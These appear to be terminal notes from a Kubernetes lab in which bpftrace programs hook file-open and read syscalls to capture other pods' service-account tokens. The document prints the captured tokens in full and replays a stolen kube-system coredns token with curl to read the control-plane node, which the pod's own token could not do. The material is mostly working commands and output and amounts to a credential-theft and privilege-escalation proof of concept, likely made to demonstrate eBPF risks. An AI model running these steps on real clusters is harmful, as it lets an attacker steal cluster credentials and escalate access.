bpftrace -e 'tracepoint:syscalls:sys_enter_openat { printf("%s %s\n", comm, str(args->filename)); }'

cat /sys/kernel/debug/tracing/events/syscalls/sys_enter_read/format

sudo bpftrace -e 'tracepoint:syscalls:sys_enter_read { if (pid == 357580) { printf("%s %s\n", comm, str(args->buf) ) }; }'


///// sys_enter_read

bash-5.2# cat /sys/kernel/debug/tracing/events/syscalls/sys_enter_read/format
name: sys_enter_read
ID: 730
format:
        field:unsigned short common_type;       offset:0;       size:2; signed:0;
        field:unsigned char common_flags;       offset:2;       size:1; signed:0;
        field:unsigned char common_preempt_count;       offset:3;       size:1; signed:0;
        field:int common_pid;   offset:4;       size:4; signed:1;

        field:int __syscall_nr; offset:8;       size:4; signed:1;
        field:unsigned int fd;  offset:16;      size:8; signed:0;
        field:char * buf;       offset:24;      size:8; signed:0;
        field:size_t count;     offset:32;      size:8; signed:0;

print fmt: "fd: 0x%08lx, buf: 0x%08lx, count: 0x%08lx", ((unsigned long)(REC->fd)), ((unsigned long)(REC->buf)), ((unsigned long)(REC->count))

/// sys_enter_openat

bash-5.2# cat /sys/kernel/debug/tracing/events/syscalls/sys_enter_openat/format
name: sys_enter_openat
ID: 672
format:
        field:unsigned short common_type;       offset:0;       size:2; signed:0;
        field:unsigned char common_flags;       offset:2;       size:1; signed:0;
        field:unsigned char common_preempt_count;       offset:3;       size:1; signed:0;
        field:int common_pid;   offset:4;       size:4; signed:1;

        field:int __syscall_nr; offset:8;       size:4; signed:1;
        field:int dfd;  offset:16;      size:8; signed:0;
        field:const char * filename;    offset:24;      size:8; signed:0;
        field:int flags;        offset:32;      size:8; signed:0;
        field:umode_t mode;     offset:40;      size:8; signed:0;

print fmt: "dfd: 0x%08lx, filename: 0x%08lx, flags: 0x%08lx, mode: 0x%08lx", ((unsigned long)(REC->dfd)), ((unsigned long)(REC->filename)), ((unsigned long)(REC->flags)), ((unsigned long)(REC->mode))

bpftrace -e 'tracepoint:syscalls:sys_enter_openat { $fn = str(args->filename); if ($fn == "/var/run/secrets/kubernetes.io/serviceaccount/token" && comm == "kindnetd") { printf("%s %s\n", comm, str(args->filename)); cat("/var/run/secrets/kubernetes.io/serviceaccount/token"); } }'

bpftrace -e 'tracepoint:syscalls:sys_enter_openat { $fn = str(args->filename); if ($fn == "/var/run/secrets/kubernetes.io/serviceaccount/token" && comm == "kindnetd") { printf("%s %s\n", comm, $fn) } }'


User-Agent: Go-http-client/1
<-sys_exit_read(pid:358364).
->sys_enter_read(pid:358364).
Command: 
<-sys_exit_read(pid:358364).
->sys_enter_read(pid:358364).
Command: 
<-sys_exit_read(pid:358364).
->sys_enter_read(pid:358364).
Command: 
<-sys_exit_read(pid:358364).
->sys_enter_openat(file:/var/run/secrets/kubernetes.io/serviceaccount/token).
->sys_enter_read(pid:358364).
Command: eyJhbGciOiJSUzI1NiIsImtpZCI6ImhSUk5UdUduNkRWSnRFVkRvZGFtWHU5WHR
<-sys_exit_read(pid:358364).

// COREDNS
curl --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6ImhSUk5UdUduNkRWSnRFVkRvZGFtWHU5WHRjUmE5c2xPeV9KN2NGVmRZcE0ifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzI5Nzc3Mzk4LCJpYXQiOjE2OTgyNDEzOTgsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsInBvZCI6eyJuYW1lIjoiY29yZWRucy01ZDc4Yzk4NjlkLTRydnZ0IiwidWlkIjoiZGIwMjI0NWMtNTU2OS00NjFhLWIzMTktNjVkMWM5ZWI2MDY1In0sInNlcnZpY2VhY2NvdW50Ijp7Im5hbWUiOiJjb3JlZG5zIiwidWlkIjoiOGI5YzkzZWMtN2YzNS00MjQwLWIyNjAtMWE0Njk1MzI3MjU2In0sIndhcm5hZnRlciI6MTY5ODI0NTAwNX0sIm5iZiI6MTY5ODI0MTM5OCwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50Omt1YmUtc3lzdGVtOmNvcmVkbnMifQ.LsFA4Hl9zWwBaYQLnRAKOy5mqbELAEWc4LBIQOAo6YTZE2NtDoxtc6IlSX5lqGDYaJnuDyOkBp-zXSkb7yQVwqNvVMMq81PDWnRihPCTviYEF8smD0yIgS61iCi8bDeDFVupjgUh5Cy8MZlPI025kfnen3c4C4blrc8ypdRGUTKoBB93HVFdCLRl432IcHiWd1AsEASxKjCVdB7AiL9lYd8gGrTBPH73VKYll0WRRkChaUgX2N9OZrqhAnRffUby4mwUY9vgQM7YjMeNyg0U5VUgG-f0J91NTXXICNM4f3CT3xZERR3qf9anD0MMeYcAomjFQrtKzpVH9WFXrZWoFw" https://kubernetes.default/api/v1/nodes/demo-control-plane

// US
curl --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6ImhSUk5UdUduNkRWSnRFVkRvZGFtWHU5WHRjUmE5c2xPeV9KN2NGVmRZcE0ifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzI5Nzc3NTQyLCJpYXQiOjE2OTgyNDE1NDIsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJnby10cmFjZXBvaW50LWV2aWwiLCJwb2QiOnsibmFtZSI6ImdvLXRyYWNlcG9pbnQtZXZpbC1kcy1wajhkOSIsInVpZCI6Ijc0ZGM5YmNmLTEwNjYtNDY3Mi1iMzcxLTkzNjM5ZDJjMDBhMiJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6Ijc0NWVkODNlLTAxZGUtNDMwYS1iZDZjLTQ3OWJkZTcwMzRlOCJ9LCJ3YXJuYWZ0ZXIiOjE2OTgyNDUxNDl9LCJuYmYiOjE2OTgyNDE1NDIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpnby10cmFjZXBvaW50LWV2aWw6ZGVmYXVsdCJ9.ASjMPcIrjEkKCFmLogI2Tjcp4-lFKa_MIalIsuqxEIvE1eiEIu9_psp9ELSCLtmpgvHs-yY1i_JEYH8hylSSlnTTo1UYhE1lKlIA6anxN-AEi3oTEs85UYreCuwIUvdCH5AamYZVmcqeghz-BmjdgH1ZDla24LdEQLHAWuoCtTWu4ArPjmfFQDMe-NvRCEq4jp_IfGL1i448F-DsNG8AE7RKOlMaYS6IjgnfBX_qm6BxclrVr9tNuCZ_7A9pJ6uETMypLv-LJJEXC6APprwu8gOZBccns4BZjgXDSIIhjiVm2dOr-2CVF5nXas1FN-Km5kiF2y9lXENcxH_jzLwJVwbash-" https://kubernetes.default/api/v1/nodes/demo-control-plane


kubectl config set-credentials --token=eyJhbGciOiJSUzI1NiIsImtpZCI6ImhSUk5UdUduNkRWSnRFVkRvZGFtWHU5WHRjUmE5c2xPeV9KN2NGVmRZcE0ifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzI5Nzc3Mzk4LCJpYXQiOjE2OTgyNDEzOTgsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsInBvZCI6eyJuYW1lIjoiY29yZWRucy01ZDc4Yzk4NjlkLTRydnZ0IiwidWlkIjoiZGIwMjI0NWMtNTU2OS00NjFhLWIzMTktNjVkMWM5ZWI2MDY1In0sInNlcnZpY2VhY2NvdW50Ijp7Im5hbWUiOiJjb3JlZG5zIiwidWlkIjoiOGI5YzkzZWMtN2YzNS00MjQwLWIyNjAtMWE0Njk1MzI3MjU2In0sIndhcm5hZnRlciI6MTY5ODI0NTAwNX0sIm5iZiI6MTY5ODI0MTM5OCwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50Omt1YmUtc3lzdGVtOmNvcmVkbnMifQ.LsFA4Hl9zWwBaYQLnRAKOy5mqbELAEWc4LBIQOAo6YTZE2NtDoxtc6IlSX5lqGDYaJnuDyOkBp-zXSkb7yQVwqNvVMMq81PDWnRihPCTviYEF8smD0yIgS61iCi8bDeDFVupjgUh5Cy8MZlPI025kfnen3c4C4blrc8ypdRGUTKoBB93HVFdCLRl432IcHiWd1AsEASxKjCVdB7AiL9lYd8gGrTBPH73VKYll0WRRkChaUgX2N9OZrqhAnRffUby4mwUY9vgQM7YjMeNyg0U5VUgG-f0J91NTXXICNM4f3CT3xZERR3qf9anD0MMeYcAomjFQrtKzpVH9WFXrZWoFw

// STANDARD
bash-5.2# curl --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6ImhSUk5UdUduNkRWSnRFVkRvZGFtWHU5WHRjUmE5c2xPeV9KN2NGVmRZcE0ifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzI5Nzc3NTQyLCJpYXQiOjE2OTgyNDE1NDIsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJnby10cmFjZXBvaW50LWV2aWwiLCJwb2QiOnsibmFtZSI6ImdvLXRyYWNlcG9pbnQtZXZpbC1kcy1wajhkOSIsInVpZCI6Ijc0ZGM5YmNmLTEwNjYtNDY3Mi1iMzcxLTkzNjM5ZDJjMDBhMiJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6Ijc0NWVkODNlLTAxZGUtNDMwYS1iZDZjLTQ3OWJkZTcwMzRlOCJ9LCJ3YXJuYWZ0ZXIiOjE2OTgyNDUxNDl9LCJuYmYiOjE2OTgyNDE1NDIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpnby10cmFjZXBvaW50LWV2aWw6ZGVmYXVsdCJ9.ASjMPcIrjEkKCFmLogI2Tjcp4-lFKa_MIalIsuqxEIvE1eiEIu9_psp9ELSCLtmpgvHs-yY1i_JEYH8hylSSlnTTo1UYhE1lKlIA6anxN-AEi3oTEs85UYreCuwIUvdCH5AamYZVmcqeghz-BmjdgH1ZDla24LdEQLHAWuoCtTWu4ArPjmfFQDMe-NvRCEq4jp_IfGL1i448F-DsNG8AE7RKOlMaYS6IjgnfBX_qm6BxclrVr9tNuCZ_7A9pJ6uETMypLv-LJJEXC6APprwu8gOZBccns4BZjgXDSIIhjiVm2dOr-2CVF5nXas1FN-Km5kiF2y9lXENcxH_jzLwJVwbash-" https://kubernetes.default/api/v1/nodes/demo-control-plane
{
  "kind": "Status",
  "apiVersion": "v1",
  "metadata": {},
  "status": "Failure",
  "message": "Unauthorized",
  "reason": "Unauthorized",
  "code": 401

//EVIL
bash-5.2# curl --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6ImhSUk5UdUduNkRWSnRFVkRvZGFtWHU5WHRjUmE5c2xPeV9KN2NGVmRZcE0ifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzI5Nzc3Mzk4LCJpYXQiOjE2OTgyNDEzOTgsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsInBvZCI6eyJuYW1lIjoiY29yZWRucy01ZDc4Yzk4NjlkLTRydnZ0IiwidWlkIjoiZGIwMjI0NWMtNTU2OS00NjFhLWIzMTktNjVkMWM5ZWI2MDY1In0sInNlcnZpY2VhY2NvdW50Ijp7Im5hbWUiOiJjb3JlZG5zIiwidWlkIjoiOGI5YzkzZWMtN2YzNS00MjQwLWIyNjAtMWE0Njk1MzI3MjU2In0sIndhcm5hZnRlciI6MTY5ODI0NTAwNX0sIm5iZiI6MTY5ODI0MTM5OCwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50Omt1YmUtc3lzdGVtOmNvcmVkbnMifQ.LsFA4Hl9zWwBaYQLnRAKOy5mqbELAEWc4LBIQOAo6YTZE2NtDoxtc6IlSX5lqGDYaJnuDyOkBp-zXSkb7yQVwqNvVMMq81PDWnRihPCTviYEF8smD0yIgS61iCi8bDeDFVupjgUh5Cy8MZlPI025kfnen3c4C4blrc8ypdRGUTKoBB93HVFdCLRl432IcHiWd1AsEASxKjCVdB7AiL9lYd8gGrTBPH73VKYll0WRRkChaUgX2N9OZrqhAnRffUby4mwUY9vgQM7YjMeNyg0U5VUgG-f0J91NTXXICNM4f3CT3xZERR3qf9anD0MMeYcAomjFQrtKzpVH9WFXrZWoFw" https://kubernetes.default/api/v1/nodes/demo-control-plane
{
  "kind": "Node",
  "apiVersion": "v1",
  "metadata": {
    "name": "demo-control-plane",
    "uid": "21411eab-b3a0-4283-9c10-e152ab440104",
    "resourceVersion": "280121",
    "creationTimestamp": "2023-10-23T02:28:27Z",
    "labels": {
      "beta.kubernetes.io/arch": "amd64",
      "beta.kubernetes.io/os": "linux",
      "kubernetes.io/arch": "amd64",
      "kubernetes.io/hostname": "demo-control-plane",
      "kubernetes.io/os": "linux",
      "node-role.kubernetes.io/control-plane": "",
      "node.kubernetes.io/exclude-from-external-load-balancers": ""
    },
    "annotations": {
      "kubeadm.alpha.kubernetes.io/cri-socket": "unix:///run/containerd/containerd.sock",
      "node.alpha.kubernetes.io/ttl": "0",
      "volumes.kubernetes.io/controller-managed-attach-detach": "true"
    },
    "managedFields": [
      {
        "manager": "kubelet",
        "operation": "Update",
        "apiVersion": "v1",
        "time": "2023-10-23T02:28:27Z",
        "fieldsType": "FieldsV1",
        "fieldsV1": {
          "f:metadata": {
            "f:annotations": {
              ".": {},
              "f:volumes.kubernetes.io/controller-managed-attach-detach": {}
            },
            "f:labels": {
              ".": {},
              "f:beta.kubernetes.io/arch": {},
              "f:beta.kubernetes.io/os": {},
              "f:kubernetes.io/arch": {},
              "f:kubernetes.io/hostname": {},
              "f:kubernetes.io/os": {}
            }
          },
          "f:spec": {
            "f:providerID": {}
          }
        }
      },
      {
        "manager": "kubeadm",
        "operation": "Update",
        "apiVersion": "v1",
        "time": "2023-10-23T02:28:30Z",
        "fieldsType": "FieldsV1",
        "fieldsV1": {
          "f:metadata": {
            "f:annotations": {
              "f:kubeadm.alpha.kubernetes.io/cri-socket": {}
            },
            "f:labels": {
              "f:node-role.kubernetes.io/control-plane": {},
              "f:node.kubernetes.io/exclude-from-external-load-balancers": {}
            }
          }
        }
      },
      {
        "manager": "kube-controller-manager",
        "operation": "Update",
        "apiVersion": "v1",
        "time": "2023-10-23T02:28:46Z",
        "fieldsType": "FieldsV1",
        "fieldsV1": {
          "f:metadata": {
            "f:annotations": {
              "f:node.alpha.kubernetes.io/ttl": {}
            }
          },
          "f:spec": {
            "f:podCIDR": {},
            "f:podCIDRs": {
              ".": {},
              "v:\"10.244.0.0/24\"": {}
            }
          }
        }
      },
      {
        "manager": "kubelet",
        "operation": "Update",
        "apiVersion": "v1",
        "time": "2023-10-25T14:08:20Z",
        "fieldsType": "FieldsV1",
        "fieldsV1": {
          "f:status": {
            "f:conditions": {
              "k:{\"type\":\"DiskPressure\"}": {
                "f:lastHeartbeatTime": {}
              },
              "k:{\"type\":\"MemoryPressure\"}": {
                "f:lastHeartbeatTime": {}
              },
              "k:{\"type\":\"PIDPressure\"}": {
                "f:lastHeartbeatTime": {}
              },
              "k:{\"type\":\"Ready\"}": {
                "f:lastHeartbeatTime": {},
                "f:lastTransitionTime": {},
                "f:message": {},
                "f:reason": {},
                "f:status": {}
              }
            },
            "f:images": {}
          }
        },
        "subresource": "status"
      }
    ]
  },
  "spec": {
    "podCIDR": "10.244.0.0/24",
    "podCIDRs": [
      "10.244.0.0/24"
    ],
    "providerID": "kind://docker/demo/demo-control-plane"
  },
  "status": {
    "capacity": {
      "cpu": "24",
      "ephemeral-storage": "322550Mi",
      "hugepages-1Gi": "0",
      "hugepages-2Mi": "0",
      "memory": "131892272Ki",
      "pods": "110"
    },
    "allocatable": {
      "cpu": "24",
      "ephemeral-storage": "322550Mi",
      "hugepages-1Gi": "0",
      "hugepages-2Mi": "0",
      "memory": "131892272Ki",
      "pods": "110"
    },
    "conditions": [
      {
        "type": "MemoryPressure",
        "status": "False",
        "lastHeartbeatTime": "2023-10-25T14:08:20Z",
        "lastTransitionTime": "2023-10-23T02:28:24Z",
        "reason": "KubeletHasSufficientMemory",
        "message": "kubelet has sufficient memory available"
      },
      {
        "type": "DiskPressure",
        "status": "False",
        "lastHeartbeatTime": "2023-10-25T14:08:20Z",
        "lastTransitionTime": "2023-10-23T02:28:24Z",
        "reason": "KubeletHasNoDiskPressure",
        "message": "kubelet has no disk pressure"
      },
      {
        "type": "PIDPressure",
        "status": "False",
        "lastHeartbeatTime": "2023-10-25T14:08:20Z",
        "lastTransitionTime": "2023-10-23T02:28:24Z",
        "reason": "KubeletHasSufficientPID",
        "message": "kubelet has sufficient PID available"
      },
      {
        "type": "Ready",
        "status": "True",
        "lastHeartbeatTime": "2023-10-25T14:08:20Z",
        "lastTransitionTime": "2023-10-23T02:28:50Z",
        "reason": "KubeletReady",
        "message": "kubelet is posting ready status"
      }
    ],
    "addresses": [
      {
        "type": "InternalIP",
        "address": "172.19.0.2"
      },
      {
        "type": "Hostname",
        "address": "demo-control-plane"
      }
    ],
    "daemonEndpoints": {
      "kubeletEndpoint": {
        "Port": 10250
      }
    },
    "nodeInfo": {
      "machineID": "e9d7e4ddbde540739dcfba4cf3b13d4c",
      "systemUUID": "aaa89d95-08c7-43b2-a662-6a54b37488ec",
      "bootID": "c865ce06-b2a0-45aa-95cf-4d51e7ff4215",
      "kernelVersion": "6.2.15-300.fc38.x86_64",
      "osImage": "Debian GNU/Linux 11 (bullseye)",
      "containerRuntimeVersion": "containerd://1.7.1",
      "kubeletVersion": "v1.27.3",
      "kubeProxyVersion": "v1.27.3",
      "operatingSystem": "linux",
      "architecture": "amd64"
    },
    "images": [
      {
        "names": [
          "docker.io/library/import-2023-10-23@sha256:7f5353d42c1585847125dd391fe07b5b4066659af625724112829e79c1949a4f"
        ],
        "sizeBytes": 1128272837
      },
      {
        "names": [
          "docker.io/library/import-2023-10-23@sha256:4a5ca8e690d7c675f0a979869a4cbf7993a6f300874c976f46bed90fef0ac659",
          "quay.io/bpfd-userspace/go-tracepoint-evil:latest"
        ],
        "sizeBytes": 1082545078
      },
      {
        "names": [
          "registry.k8s.io/etcd:3.5.7-0"
        ],
        "sizeBytes": 101639218
      },
      {
        "names": [
          "docker.io/library/import-2023-06-15@sha256:0202953c0b15043ca535e81d97f7062240ae66ea044b24378370d6e577782762",
          "registry.k8s.io/kube-apiserver:v1.27.3"
        ],
        "sizeBytes": 83456511
      },
      {
        "names": [
          "docker.io/library/import-2023-06-15@sha256:bdbeb95d8a0820cbc385e44f75ed25799ac8961e952ded26aa2a09b3377dfee7",
          "registry.k8s.io/kube-controller-manager:v1.27.3"
        ],
        "sizeBytes": 74420365
      },
      {
        "names": [
          "docker.io/library/import-2023-06-15@sha256:ce2145a147b3f1fc440ba15eaa91b879ba9cbf929c8dd8f3190868f4373f2183",
          "registry.k8s.io/kube-proxy:v1.27.3"
        ],
        "sizeBytes": 72711677
      },
      {
        "names": [
          "quay.io/bpfd-userspace/go-tracepoint-counter@sha256:7ad034865d02088c498a52a84130d5a4d14939469fedeaaf64a91a6db1abb862",
          "quay.io/bpfd-userspace/go-tracepoint-counter:latest"
        ],
        "sizeBytes": 64837942
      },
      {
        "names": [
          "docker.io/library/import-2023-06-15@sha256:9d6f903c0d4bf3b145c7bbc68727251ca1abf98aed7f8d2acb9f6a10ac81e8c2",
          "registry.k8s.io/kube-scheduler:v1.27.3"
        ],
        "sizeBytes": 59801741
      },
      {
        "names": [
          "docker.io/kindest/kindnetd:v20230511-dc714da8"
        ],
        "sizeBytes": 27731571
      },
      {
        "names": [
          "docker.io/kindest/local-path-provisioner:v20230511-dc714da8"
        ],
        "sizeBytes": 19351145
      },
      {
        "names": [
          "registry.k8s.io/coredns/coredns:v1.10.1"
        ],
        "sizeBytes": 16190758
      },
      {
        "names": [
          "docker.io/kindest/local-path-helper:v20230510-486859a6"
        ],
        "sizeBytes": 3052318
      },
      {
        "names": [
          "registry.k8s.io/pause:3.7"
        ],
        "sizeBytes": 311278
      }
    ]
  }
}